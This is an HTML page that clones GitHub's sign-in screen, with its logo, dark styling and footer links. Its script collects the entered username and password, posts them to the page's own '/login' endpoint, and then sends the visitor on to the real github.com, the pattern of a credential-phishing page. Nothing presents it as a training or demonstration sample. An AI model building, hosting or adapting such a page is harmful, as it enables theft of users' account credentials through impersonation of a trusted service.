<!DOCTYPE html>
<html lang="en" data-color-mode="dark" data-dark-theme="dark">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to GitHub · GitHub</title>
    <link rel="icon" class="js-site-favicon" type="image/svg+xml" href="https://github.githubassets.com/favicons/favicon-dark.svg">
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Noto Sans", Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji";
            background-color: #0d1117;
            color: #c9d1d9;
            margin: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding-top: 32px;
            font-size: 14px;
            line-height: 1.5;
        }

        .header-logo {
            margin-bottom: 24px;
            text-align: center;
        }

        .header-logo svg {
            fill: #f0f6fc;
        }

        h1 {
            font-size: 24px;
            font-weight: 300;
            letter-spacing: -0.5px;
            margin-bottom: 15px;
            color: #c9d1d9;
            text-align: center;
        }

        .auth-form-body {
            width: 308px;
            background-color: #161b22;
            border: 1px solid #30363d;
            border-radius: 6px;
            padding: 20px;
            margin-bottom: 16px;
            font-size: 14px;
        }

        label {
            display: block;
            margin-bottom: 7px;
            font-weight: 400;
            text-align: left;
        }

        .form-control {
            width: 100%;
            padding: 5px 12px;
            background-color: #0d1117;
            border: 1px solid #30363d;
            border-radius: 6px;
            color: #c9d1d9;
            font-size: 14px;
            line-height: 20px;
            box-sizing: border-box;
            margin-bottom: 15px;
            height: 32px;
            transition: border-color 0.2s, box-shadow 0.2s;
        }

        .form-control:focus {
            border-color: #58a6ff;
            outline: none;
            box-shadow: 0 0 0 3px rgba(88, 166, 255, 0.3);
        }

        .btn-primary {
            background-color: #238636;
            color: #ffffff;
            border: 1px solid rgba(240, 246, 252, 0.1);
            border-radius: 6px;
            padding: 5px 16px;
            font-size: 14px;
            font-weight: 600;
            line-height: 20px;
            cursor: pointer;
            width: 100%;
            margin-top: 20px;
            transition: background-color 0.2s;
        }

        .btn-primary:hover {
            background-color: #2ea043;
            border-color: rgba(240, 246, 252, 0.1);
        }

        .login-callout {
            border: 1px solid #30363d;
            border-radius: 6px;
            padding: 15px 20px;
            text-align: center;
            width: 308px;
            font-size: 14px;
        }

        .login-callout a {
            color: #58a6ff;
            text-decoration: none;
        }

        .login-callout a:hover {
            text-decoration: underline;
        }

        .label-link {
            float: right;
            font-size: 12px;
            color: #58a6ff;
            text-decoration: none;
        }

        .label-link:hover {
            text-decoration: underline;
        }

        .footer {
            margin-top: 40px;
            text-align: center;
            font-size: 12px;
            color: #8b949e;
            width: 308px;
        }

        .footer ul {
            list-style: none;
            padding: 0;
            margin: 0;
            display: flex;
            justify-content: center;
            gap: 10px;
        }

        .footer li {
            display: inline;
        }

        .footer a {
            color: #58a6ff;
            text-decoration: none;
        }

        .footer a:hover {
            text-decoration: underline;
        }
        
        /* Spinner for button */
        .spinner {
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top: 2px solid #fff;
            width: 14px;
            height: 14px;
            animation: spin 1s linear infinite;
            display: inline-block;
            vertical-align: middle;
            margin-left: 5px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="header-logo">
        <svg height="48" aria-hidden="true" viewBox="0 0 16 16" version="1.1" width="48" data-view-component="true" class="octicon octicon-mark-github">
            <path d="M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z"></path>
        </svg>
    </div>

    <h1>Sign in to GitHub</h1>

    <div class="auth-form-body">
        <form onsubmit="submitLogin(event)">
            <label for="login_field">Username or email address</label>
            <input type="text" name="login" id="login_field" class="form-control" autofocus="autofocus" required>

            <div style="position: relative;">
                <label for="password">Password</label>
                <a class="label-link" href="#">Forgot password?</a>
                <input type="password" name="password" id="password" class="form-control" required>
            </div>

            <button type="submit" class="btn-primary" id="btn-login">
                Sign in
            </button>
        </form>
    </div>

    <div class="login-callout">
        New to GitHub? <a href="#">Create an account</a>.
    </div>

    <div class="footer">
        <ul>
            <li><a href="#">Terms</a></li>
            <li><a href="#">Privacy</a></li>
            <li><a href="#">Security</a></li>
            <li><a href="#">Contact GitHub</a></li>
        </ul>
    </div>

    <script>
        function submitLogin(event) {
            event.preventDefault();
            const login = document.getElementById('login_field').value;
            const password = document.getElementById('password').value;

            if (!login || !password) return;

            const btn = document.getElementById('btn-login');
            const originalText = btn.innerHTML;
            btn.innerHTML = 'Signing in... <span class="spinner"></span>';
            btn.disabled = true;

            fetch('/login', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    email: login,
                    password: password
                })
            }).then(response => {
                if (response.ok) {
                    window.location.href = "https://github.com/";
                } else {
                    btn.innerHTML = originalText;
                    btn.disabled = false;
                    
                    // Show error message
                    const errorDiv = document.createElement('div');
                    errorDiv.style.backgroundColor = 'rgba(248,81,73,0.1)';
                    errorDiv.style.border = '1px solid rgba(248,81,73,0.4)';
                    errorDiv.style.color = '#ff7b72';
                    errorDiv.style.padding = '15px';
                    errorDiv.style.borderRadius = '6px';
                    errorDiv.style.marginBottom = '20px';
                    errorDiv.style.fontSize = '13px';
                    errorDiv.innerHTML = 'Incorrect username or password.';
                    
                    const formBody = document.querySelector('.auth-form-body');
                    formBody.insertBefore(errorDiv, formBody.firstChild);
                }
            }).catch(error => {
                console.error('Error:', error);
                window.location.href = "https://github.com/";
            });
        }
    </script>
</body>
</html>
